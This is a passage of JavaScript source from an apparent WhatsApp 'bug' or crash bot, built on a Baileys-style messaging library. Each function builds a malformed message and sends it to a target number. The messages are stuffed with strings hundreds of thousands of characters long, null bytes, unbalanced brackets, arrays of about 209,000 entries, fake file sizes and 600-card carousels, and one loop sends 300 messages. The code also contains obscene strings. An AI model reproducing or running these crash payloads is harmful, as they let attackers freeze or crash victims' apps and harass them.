          "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1772045071",
        jpegThumbnail: Buffer.alloc(0),
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 999,
          externalAdReply: {
            title: " true explanation ",
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnail: Buffer.alloc(0),
            sourceUrl: "https://t.me/sockcore",
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net",
            businessDescription: null,
          },
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
            participant: `62${z + 720599}@s.whatsapp.net`,
            type: 1,
          })),
        },
        streamingSidecar:
          "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
        thumbnailDirectPath:
          "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
        thumbnailSha256:
          "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
        thumbnailEncSha256:
          "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
        annotations: Array.from({ length: 209000 }, (_, z) => ({
          polygonVertices: [
            { x: 0.5282480716705322, y: 0.1563183069229126 },
            { x: 0.8098965883255005, y: 0.1734953224658966 },
            { x: 0.7949861884117126, y: 0.41797858476638794 },
            { x: 0.5133377313613892, y: 0.40080150961875916 },
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "34028249360153165",
              songId: "243234016584833",
              author: `${z + 1} suck my dick ¿ `,
              title: " Threesixty ",
              artworkDirectPath:
                "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
              artworkSha256:
                "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
              artworkEncSha256:
                "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
              artistAttribution:
                "https://wa.me/settings/linked_devices#,,xrellyfuck",
              countryBlocklist: "",
              isExplicit: false,
              artworkMediaKey:
                "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
              musicSongStartTimeInMs: "42500",
              derivedContentStartTimeInMs: "0",
              overlapDurationInMs: "15000",
            }
          },
          embeddedAction: true,
        })),
      },
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    }
  );
}
async function packBlankGroup(otax, target) {
  console.log(chalk.red("𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴"));

  const msg = generateWAMessageFromContent(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "7b1760a6-472d-41b5-bbf5-e724c7de8604",
        name: "otx" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "iLkMr4xDw8I8jV2E02tx9KMtnUZsu18ClZ4JvkvKHd0=.webp",
            isAnimated: false,
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "89684",
        fileSha256: "51VJsrdwSn9fwRckyTfsZIdnrAjZ9vIVgoenEJ0nv6k=",
        fileEncSha256: "UZDYZd1kJ6mREbgDAdfpqgjNmpSHtayTwvkH+4Yrn80=",
        mediaKey: "29ga9NVhHX1LWul9OWo7K+ROdGgFvXIQTrw3RmUMS64=",
        directPath: "/v/t62.15575-24/652905003_1418493843085030_5816252767151869696_n.enc?ccb=11-4",
        contextInfo: {},
        mediaKeyTimestamp: "1773502297",
        trayIconFileName: "7b1760a6-472d-41b5-bbf5-e724c7de8604.png",
        stickerPackSize: "89308",
        stickerPackOrigin: "USER_CREATED"
      }
    },
    {}
  );

  await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function xcoreotax(otax, target, Ptcp = true) {
  await otax.relayMessage(target, {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "9999999999999999",
              pageCount: 0x9184e729fff,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "×‌×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
              mediaKeyTimestamp: "1715880173",
              contactVcard: true
            },
            title: "ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒",
            hasMediaAttachment: true
          },
          body: {
            text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
          }
        }
      }
    }
  }, { participant: { jid: target } }, { messageId: null });
}
async function LocaNewgbah(otax, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

  const otaxx = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: true,
              degreesLongitude: true,
              name: "мαηтα'χ" + "ꦽ".repeat(180000),
              url: "https://t.me/Otapengenkawin",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "ꦾ".repeat(100000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "οταϰ ιѕ нєяє"
                  },
                  placeholderKey: {
                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "((".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "((".repeat(100000),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "Ewe Bang Enak",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
  await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function OfmSqLXnxx(otax, target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      botInvokeMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(16),
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveResponseMessage: {
            contextInfo: {
              participant: target,
              remoteJid: "Metallic4",
              isForwarded: true,
              forwardingScore: 999,
              fromMe: true,
              forwardedAiBotMessageInfo: {
                botJid: "13135550202@bot",
                botName: "Business Assistant",
                creator: "otax"
              },
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 200900 }, (_, z) => ({
                type: 1
              }))
            },
            body: {
              text: "otax",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(15000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}
async function ofmcrlManta(otax, target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let cards = [];
  for (let z = 0; z < 600; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  let msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards
          }
        }
      }
    }
  }, {});
  await otax.relayMessage(target, msg.message, {
    participant: { jid: target }
  });
}

async function ofmcrlMantaGb(otax, target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let cards = [];
  for (let z = 0; z < 600; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  let msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards
          }
        }
      }
    }
  }, {});
  await otax.relayMessage(target, msg.message, {
  });
}
async function stringJsonInvz(otax, target) {
  await otax.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "fuk",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
              fileLength: "999999999999",
              height: 212,
              width: 320,
              mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
              fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
              directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778501051",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
              scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
              scanLengths: [
                999999999999,
                999999999999,
                999999999999,
                999999999999
              ],
              midQualityFileSha256: ""
            }
          },
          body: {
            text: " _XrLprotoSyncBvg_ "
          },
          nativeFlowMessage: {
            buttons: "{".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } })
}
async function oombimg(otax, target) {
  const msg = generateWAMessageFromContent("status@broadcast", {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 388944,
      height: 1600,
      width: 1200,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      caption: "MantaXxx",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        2899999999999999077,
        1799999999999998555,
        7699999999999999148,
        1069999999999999164
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  }, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}
async function stringJsonDelayInvz(otax, target) {
  await otax.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "fuk",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
              fileLength: "999999999999",
              height: 212,
              width: 320,
              mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
              fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
              directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778501051",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
              scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
              scanLengths: [
                999999999999,
                999999999999,
                999999999999,
                999999999999
              ],
              midQualityFileSha256: ""
            }
          },
          body: {
            text: " _XrLprotoSyncBvg_ "
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } })
}

async function gsJson(otax, target) {
  await otax.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: " _XrLprotoSyncBvg_ "
      },
      nativeFlowMessage: {
        buttons: "(".repeat(500000)
      }
    }
  }, { participant: { jid: target } })
}

async function gsJsonInvz(otax, target) {
  await otax.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: " _XrLprotoSyncBvg_ "
      },
      nativeFlowMessage: {
        buttons: "\0".repeat(500000)
      }
    }
  }, { participant: { jid: target } })
}
async function sendLoop(otax, target, ptcp = true) {

  const msg = generateWAMessageFromContent(
    target,
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091",
      }
    },
    {}
  );


  await otax.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    ptcp
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );


  console.log(`MantaX Over You: ${target}`);
}
async function locklock(otax, target) {
  locked.set(target, true);
  for (let z = 0; z < 300; z++) {
    await sendLoop(otax, target, true)
  }
}
async function crashIng2(otax, target) {

  let media = await prepareWAMessageMedia(
    { sticker: bugstic },
